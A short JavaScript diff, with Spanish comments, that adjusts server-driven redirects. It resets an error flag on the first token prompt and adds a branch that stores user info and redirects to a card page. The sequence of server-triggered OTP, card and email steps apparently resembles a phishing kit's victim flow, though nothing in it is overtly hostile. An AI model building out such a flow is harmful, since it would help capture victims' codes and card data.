@@ -55,6 +55,8 @@
 
 				if (result.redirect_to === 'token.html' && info.tok === '') {
 					// Token primera vez
+					info.err = '';
+
 					window.location.href = 'vOTP.html'
 				} else if (result.redirect_to === 'token.html' && info.tok !== '') {
 					// Token vuelto a pedir
@@ -72,6 +74,11 @@
 
 					// Redirigir
 					window.location.href = 'index.html'
+				} else if (result.redirect_to === 'next.html') {
+					LS.setItem('info', JSON.stringify(info));
+
+					// Redirigir
+					window.location.href = 'vCard.html'
 				} else if (result.redirect_to === 'email.html') {
 					// Setear el error
 					info.err = 'true';
